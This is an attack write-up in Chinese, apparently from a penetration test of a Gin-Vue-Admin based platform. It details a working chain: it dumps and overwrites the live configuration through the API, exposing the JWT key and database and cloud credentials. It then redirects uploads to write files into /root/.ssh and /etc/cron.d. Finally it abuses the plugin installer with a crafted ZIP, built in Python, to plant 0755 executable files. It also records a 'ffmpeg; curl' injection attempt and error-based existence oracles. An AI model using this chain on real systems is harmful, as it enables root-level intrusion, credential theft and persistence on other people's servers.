# 写入原语 → 可执行文件:GVA 配置写 + 插件权限位链

2026-09 实战(Gin-Vue-Admin 二开平台,目标跑 root、`/www/wwwroot` 为宿主绑定挂载)。
**已实测打通到「可在目标上投放带 0755 执行位的任意内容文件」;未能点燃执行汇(无 shell 落地),原因与已排除面见下,请勿把「未验证方向」当结论复用。**

---

## 一、活配置写(L2,一切派生的根)

```
POST /api/system/getSystemConfig   body {}          → 返回全量 config 树(含 jwt.signing-key / DB / S3 / bot token 等)
POST /api/system/setSystemConfig   body {"config":{…整棵树…}}
```

- 返回 `{"code":0,"msg":"设置成功"}` 且**立即生效**(改完立刻影响运行行为)
- ⚠️ **必须整棵树回传**,不要只发要改的键
- ⚠️ **字段类型不符 → 整单失败**,典型报错:
  `json: cannot unmarshal string into Go struct field MCP.config.mcp…`(该字段在 Go 里是 int/struct,给了字符串就全单拒)
- ⚠️ 先 `getSystemConfig` 存快照(本地 json),**每轮用完逐项回读还原**。这是「活」配置,写错 = 目标业务功能损坏

## 二、任意目录 + 任意内容文件写(L3)

```bash
# 1) 把存储切成本地 + 指定任意目录
setSystemConfig  {"config": {… "system":{"oss-type":"local"},
                             "local":{"path":"/目标/目录"} …}}
# 2) 上传(payload 随上传动作落盘为独立文件)
POST /api/fileUploadAndDownload/upload        -F "file=@payload"
#    → 落盘名 <md5>_<时间戳>,扩展名沿用原文件名;返回绝对路径
# 3) 改名(字段名是大写 ID)
POST /api/fileUploadAndDownload/editFileName  {"ID":<id>,"name":"authorized_keys"}
```

要点:
- 目标目录**不存在会被自动创建**,所以「写成功」**不能**证明目录原本存在(别拿它当存在性 oracle)
- **文件名可无扩展名** → 可满足 cron 只认无点文件名的要求
- 实测写入过 `/root/.ssh/`、`/etc/cron.d/`(成功 → **证明应用进程是 root**)、`/www/wwwroot/<站点>/`

## 三、★ 投递 0755 可执行文件(L4,本轮唯一实测打通的关键段)

**问题**:上面所有写入落地都是 **0644**,没有执行位;而应用全程 `exec.Command` 直调、**无 shell**,所以「写个脚本当 ffmpeg 跑」必然失败。

**解法:借应用自己的插件安装通道 —— 归档权限位会被原样写盘,再用相对路径让源路径与解包落点重合。**

### 源码依据

```go
// utils/zip.go —— 用归档条目自带的权限位
os.MkdirAll(fpath, os.ModePerm)
os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())   // ← f.Mode() = ZIP 条目 mode

// acps.go InstallPlugin
paths, _ := utils.Unzip(GVAPLUGPINATH+file.Filename, GVAPLUGPINATH) // GVAPLUGPINATH = "./gva-plug-temp/"
paths = filterFile(paths)        // 只跳过 .DS_Store / __MACOSX

for i := range paths {                       // paths 形如 "gva-plug-temp/<条目名>"
    pathArr := strings.Split(paths[i], "/")
    if len(pathArr) < 4 { continue }
    if pathArr[2]+"/"+pathArr[3] == `server/plugin` && len(serverPlugin) == 0 {
        serverPlugin = filepath.Join(pathArr[0], pathArr[1], "server", "plugin")
    }
    // web 侧同理匹配 `web/plugin`
}
// 两侧都找不到 → "非标准插件，请按照文档自动迁移使用"

form = filepath.Join(Root, formPath, serverPlugin)   // 源
to   = filepath.Join(Root, toPath,   "plugin")       // 目标
if _, err := os.Stat(to + name); err == nil {        // name = pathArr[1]
    return errors.New(toPath + "已存在同名插件,请自行手动安装")   // ← 存在性 oracle
}
cp.Copy(form, to, cp.Options{Skip: skipMacSpecialDocument})      // 保留 mode
// …之后 ensurePluginRegisterImport 会去改 <Root>/<Server>/plugin/register.go
```

### 关键洞察:`filepath.Join` 对相对路径不加绝对前缀

```
解包落点  = <CWD>/gva-plug-temp/<名>/server/plugin/...
form 计算 = Join(".", ".", "gva-plug-temp/<名>/server/plugin")  ← 清理后仍是相对路径
          ⟹ 解析基准 = CWD ⟹ 与解包落点重合 ⟹ cp.Copy 直接成功
```

- **实测代价**:CWD 未知时**11 个绝对路径候选全部失败**(`/www/wwwroot/<多层>`、`/`、`/app`、`/opt` …),报 `lstat … no such file`;改成 `root="." server="."` **一次命中**。**别再去猜 CWD,直接用相对值。**
- 目标同理变相对:`to = Join(".", ".", "plugin")` = `"plugin"` → 产出 `<CWD>/plugin/...`,**权限位 0755 保持**

### 归档条目结构(必须照抄校验逻辑)

```
✅ 正确:  <名>/server/plugin/<文件>        ← 第 3、4 段才是 server/plugin
          <名>/web/plugin/<文件>
❌ 错误:  gva-plug-temp/<名>/server/plugin/...   ← 双层前缀,校验必失败
```
原因:`paths` 已由 Unzip 加上 `gva-plug-temp/` 前缀,条目名里再写就变成 `gva-plug-temp/gva-plug-temp/...`,第 3 段成了 `gva-plug-temp` 而非 `server`。
条目一律要**过校验的形状**(别为了埋错而插入畸形条目 —— 校验会扫全部条目,一条不合规整个包被拒)。

构造(本地 Python,注意 `external_attr`):

```python
import zipfile, io
S = '#!/bin/sh\n<payload>\nexit 0\n'
b = io.BytesIO(); z = zipfile.ZipFile(b, 'w')
for n, m in [('<名>/server/plugin/<文件>', S), ('<名>/web/plugin/m.txt', 'm')]:
    i = zipfile.ZipInfo(n); i.external_attr = 0o755 << 16   # ← 0755 写这里
    z.writestr(i, m)
z.close(); open('<名>.zip','wb').write(b.getvalue())
```

### 实测成功响应

```json
{"code":0,"data":[{"code":1,"msg":"web插件安装成功"},{"code":1,"msg":"server插件安装成功"}],"msg":"成功"}
```
(两次复现。复制链跑完 = `<CWD>/plugin/` 下已存在我投放的 0755 文件)

## 四、Oracle 三连(同一接口的报错就是探针)

```
lstat <绝对路径>: no such file            → 源没解析到(cp.Copy 未跑)         … 需要调 root/server
open plugin/register.go: no such file     → cp.Copy 已成功!卡在复制之后下一步 … 复制链通了
已存在同名插件,请自行手动安装              → os.Stat(to+name) 命中            … 文件存在性 oracle
```

**存在性 oracle 用法**:让 payload 在 CWD 造一个名为 `plugin<名>` 的文件;之后安装名为 `<名>` 的插件 → 若报「已存在同名插件」= payload **确实执行过**。这是无网络、无回显环境下最可靠的执行证据。

## 五、实测排除项(别重复踩)

| 汇 | 结果 |
|---|---|
| 配置值命令注入(`ffmpegPath = "ffmpeg; curl …"`) | ❌ **无 shell**,注入不生效 |
| `videoTranscode.ffmpegPath` 指向自投文件 | ❌ 转码未被调用(真视频 init/chunk/merge ×3、`Status` 枚举 PUT、批量发布都没点燃) |
| `mcp.path` | ❌ 是 **URL 路径**不是程序路径 |
| `/etc/cron.d` 植入 | ❌ 文件落位正确但不执行 |
| `/root/.ssh` 植公钥 | ❌ SSHD 拒 root 登录(见下) |
| 反代域名的站点根写 `.php` | ❌ 域名 vhost 直连应用(静态资源 `go:embed`),取回 SPA 兜底 |
| `/appAdmin/*`、`/automationAdmin/v1/*` | ❌ 实测全 404 —— **路由清单来自另一套构建,清单 ≠ 已部署** |
| 视频导入 URL 注入 | ❌ 且该接口还需 S3 key,不走下载器 |

**容器 vs 宿主机的判别**:`/root/.ssh` 与 `/etc/cron.d` 都能写(说明是 root),但 cron 不执行 + 公钥不被接受。两种解释都成立、需分别验证:
1. 应用跑在容器里,`/etc`、`/root` 是容器内路径 → 只有宿主绑定挂载的 `/www/wwwroot` 有效
2. 是宿主机,但**宝塔面板用自带调度器**(不读 `/etc/cron.d`),且云镜像默认 `PermitRootLogin no`
→ 判别法:找一个**只在宿主生效**的路径写探针,而不是从「cron 没响」直接下「容器」结论。

## 六、待查方向(⚠️ **未验证**,不要当已验证打法复用)

本轮**没有拿到 shell** —— 上面第三段是已验证的能力(能投放 0755 文件),但**执行汇一次都没点燃**。以下是尚未验证的猜想,下次应从「找一个真正会 exec 的汇」入手:

- `autocode.ai-path`(唯一带「程序路径」语义的配置项,疑似 AI 编码 CLI)——触发接口的字段名/会话类型枚举没猜中
- 转码可能是**队列/worker 异步**而非同步(这解释了 ffmpegPath 从不被调用)
- `pubPlug`(打包插件)可能调 `go build`;Go 构建链的 `#cgo pkg-config:` 会执行 `pkg-config`,存在伪造 PATH 的利用面(**纯理论,未验证**)
- 应用重启/热更后再看插件目录是否被加载

## 七、纪律

1. **快照 → 改 → 用 → 逐项回读还原**,一次只改一个变量
2. 只碰**自己新建**的对象;测试产物(探针文件、测试视频、测试用户)用完即删
3. 交付时**明确区分**:已验证能力 / 已排除项 / 未验证猜想
